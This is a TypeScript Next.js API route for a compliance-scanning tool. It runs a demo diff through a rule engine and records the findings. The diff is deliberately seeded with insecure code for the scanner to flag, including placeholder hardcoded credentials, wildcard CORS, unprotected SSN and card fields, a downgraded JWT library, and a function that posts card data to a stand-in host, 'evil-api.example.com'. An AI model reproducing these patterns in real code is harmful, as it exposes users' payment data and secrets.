import { NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { analyzeDiff } from '@/lib/rule-engine/engine';
import { calculateComplianceScore } from '@/lib/compliance/scoring';
import { createEvidenceRecord } from '@/lib/compliance/evidence';

// IMPORTANT: These are placeholder/fake values for demo purposes only.
// No real secrets are used.
const DEMO_DIFF = `diff --git a/src/config.py b/src/config.py
new file mode 100644
index 0000000..abc1234
--- /dev/null
+++ b/src/config.py
@@ -0,0 +1,8 @@
+import os
+
+API_KEY = "DEMO_API_KEY_placeholder_xxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+DATABASE_URL = "postgresql://admin:REDACTED_PASSWORD@db.example.com:5432/prod"
+PASSWORD = "DEMO_PASSWORD_xxxxxxxxxx"
+
+app.config['CORS_HEADERS'] = 'Content-Type'
+cors = CORS(app, resources={r"/*": {"origins": "*"}})
diff --git a/src/models/user.py b/src/models/user.py
new file mode 100644
index 0000000..def5678
--- /dev/null
+++ b/src/models/user.py
@@ -0,0 +1,15 @@
+class User(Base):
+    __tablename__ = 'users'
+    id = Column(Integer, primary_key=True)
+    email = Column(String(255), nullable=False)
+    phone = Column(String(20))
+    ssn = Column(String(11))
+    credit_card = Column(String(20))
+    address = Column(Text)
+    date_of_birth = Column(Date)
+
+    def delete_all_users(self):
+        db.session.query(User).delete()
+        return {"deleted": True}
diff --git a/src/services/payment.py b/src/services/payment.py
new file mode 100644
index 0000000..ghi9012
--- /dev/null
+++ b/src/services/payment.py
@@ -0,0 +1,8 @@
+import requests
+
+def process_payment(card_data):
+    response = requests.post('https://evil-api.example.com/charge', json=card_data)
+    return response.json()
+
+def fetch_user_data():
+    resp = requests.get('https://api.github.com/user')
+    return resp.json()
diff --git a/package-lock.json b/package-lock.json
--- a/package-lock.json
+++ b/package-lock.json
@@ -1234,7 +1234,7 @@
 "node_modules/jsonwebtoken": {
-  "version": "9.0.0",
+  "version": "8.5.1",
   "resolved": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-8.5.1.tgz"
 }`;

export async function POST() {
  try {
    const result = analyzeDiff(DEMO_DIFF);
    const org = await db.organization.findFirst({ orderBy: { createdAt: 'asc' } });
    if (!org) {
      return NextResponse.json({ error: 'No organization found. Please seed the database first.' }, { status: 400 });
    }
    let repo = await db.repository.findFirst({ where: { fullName: 'acme-corp/payments-api' } });
    if (!repo) {
      repo = await db.repository.create({
        data: {
          organizationId: org.id,
          name: 'payments-api',
          fullName: 'acme-corp/payments-api',
          owner: 'acme-corp',
          language: 'Python',
          visibility: 'PRIVATE',
          framework: 'soc2',
        },
      });
    }
    const prCount = await db.pullRequest.count({ where: { repositoryId: repo.id } });
    const pr = await db.pullRequest.create({
      data: {
        repositoryId: repo.id,
        number: prCount + 42,
        title: 'feat: add payment processing and user models',
        author: 'demo-developer',
        sourceBranch: 'feature/payment-integration',
        targetBranch: 'main',
        status: 'OPEN',
      },
    });
    const analysisRun = await db.analysisRun.create({
      data: {
        pullRequestId: pr.id,
        status: 'COMPLETED',
        startedAt: new Date(),
        completedAt: new Date(),
        durationMs: 1200,
        score: Math.round(result.summary.total > 0 ? Math.max(40, 100 - result.summary.blocking * 15 - result.summary.warning * 5) : 100),
        filesAnalyzed: result.summary.files_scanned,
        findingsCount: result.summary.total,
        summary: `${result.summary.blocking} blocking, ${result.summary.warning} warnings, ${result.summary.info} info`,
      },
    });
    for (const finding of result.findings) {
      const created = await db.finding.create({
        data: {
          analysisRunId: analysisRun.id,
          category: finding.rule_id.split('-')[0].toUpperCase(),
          title: `${finding.rule_id}: ${finding.rule_name}`,
          description: finding.explanation,
          severity: finding.tier === 'BLOCKING' ? 'CRITICAL' : finding.tier === 'WARNING' ? 'HIGH' : 'MEDIUM',
          confidence: finding.confidence,
          status: 'OPEN',
          filePath: finding.file,
          lineStart: finding.line,
          lineEnd: finding.line,
          evidence: finding.match_content ? 'Matched pattern in code' : 'Detected by static analysis',
          impact: `${finding.rule_name} violates compliance requirements`,
          recommendation: finding.suggested_fix,
          suggestedFix: finding.suggested_fix,
          actionLevel: finding.tier,
        },
      });
      for (const [fw, ctrl] of Object.entries(finding.framework_citations || {})) {
        await db.complianceMapping.create({
          data: {
            findingId: created.id,
            framework: fw.toUpperCase(),
            control: ctrl.control,
            controlName: ctrl.name,
            rationale: `Automated mapping: ${finding.rule_id} -> ${fw.toUpperCase()} ${ctrl.control}`,
          },
        });
      }
      await createEvidenceRecord({
        organizationId: org.id,
        repositoryId: repo.id,
        findingId: created.id,
        eventType: 'FINDING_DETECTED',
        actor: 'driftfix-engine',
        payload: { ruleId: finding.rule_id, tier: finding.tier, file: finding.file, line: finding.line },
      });
    }
    const allOpenFindings = await db.finding.findMany({ where: { status: 'OPEN' } });
    const newScore = Math.round(calculateComplianceScore(allOpenFindings));
    await db.complianceScoreHistory.create({
      data: {
        organizationId: org.id,
        repositoryId: repo.id,
        score: newScore,
        weekLabel: new Date().toISOString().split('T')[0],
      },
    });
    return NextResponse.json({
      success: true,
      analysisRun: {
        id: analysisRun.id,
        score: analysisRun.score,
        findingsCount: analysisRun.findingsCount,
        findings: result.findings.map((f) => ({
          id: f.rule_id,
          rule_id: f.rule_id,
          rule_name: f.rule_name,
          tier: f.tier,
          file: f.file,
          line: f.line,
          explanation: f.explanation,
          suggested_fix: f.suggested_fix,
          confidence: f.confidence,
        })),
      },
    });
  } catch (error) {
    console.error('Demo analysis failed:', error);
    return NextResponse.json({ error: 'Demo analysis failed' }, { status: 500 });
  }
}
